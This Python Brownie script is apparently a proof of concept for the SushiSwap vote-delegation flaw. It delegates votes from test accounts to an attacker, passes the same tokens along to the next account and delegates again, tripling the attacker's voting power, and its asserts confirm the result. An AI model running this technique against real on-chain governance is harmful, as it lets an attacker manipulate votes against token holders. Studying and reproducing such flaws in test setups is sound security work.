#!/usr/bin/python3
from brownie import VoteToken
from colorama import Fore
from scripts.deploy import deploy

# https://medium.com/valixconsulting/sushiswap-voting-vulnerability-of-sushi-token-and-its-forks-56f220d4c9baw

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack():
    vToken, owner, alice, bob, carl, attacker = deploy()
    # print(vToken.balanceOf(attacker))
    # print(vToken.balanceOf(alice))

    # delegate attacker from alice
    vToken.delegate(attacker.address, {"from": alice}).wait(1)
    print(f"{green}Attacker votes: {red}{vToken.getVotes(attacker)}{reset}")

    # transfer the funds to bob so that he can vote again
    vToken.transfer(bob.address, 1000, {"from": alice}).wait(1)

    print(f"{red}Funds transferred from alice to bob{reset}")
    print(f"{green}Balance of Alice: {magenta}{vToken.balanceOf(alice)}{reset}")
    print(f"{green}Balance of Bob: {magenta}{vToken.balanceOf(bob)}{reset}")

    # same task vote for attacker from bob
    vToken.delegate(attacker.address, {"from": bob}).wait(1)
    print(f"{green}Attacker votes: {red}{vToken.getVotes(attacker)}{reset}")

    vToken.transfer(carl.address, 1000, {"from": bob}).wait(1)
    print(f"{red}Funds transferred from Bob to Carl{reset}")

    print(f"{green}Balance of Bob: {magenta}{vToken.balanceOf(bob)}{reset}")
    print(f"{green}Balance of Carl: {magenta}{vToken.balanceOf(carl)}{reset}")

    # same task vote for attacker from carl
    vToken.delegate(attacker.address, {"from": carl}).wait(1)
    print(f"{green}Attacker votes: {red}{vToken.getVotes(attacker)}{reset}")

    vToken.transfer(attacker.address, 1000, {"from": carl}).wait(1)
    print(f"{red}Funds transferred from Carl to Attacker{reset}")

    print(f"{green}Balance of Alice: {magenta}{vToken.balanceOf(alice)}{reset}")
    print(f"{green}Balance of Bob: {magenta}{vToken.balanceOf(bob)}{reset}")
    print(f"{green}Balance of Carl: {magenta}{vToken.balanceOf(carl)}{reset}")
    print(f"{green}Balance of Atacker: {magenta}{vToken.balanceOf(attacker)}{reset}")
    print(f"{green}Attacker votes: {red}{vToken.getVotes(attacker)}{reset}")

    assert vToken.getVotes(attacker) == 3000
    assert vToken.balanceOf(attacker) == 1000


def main():
    attack()
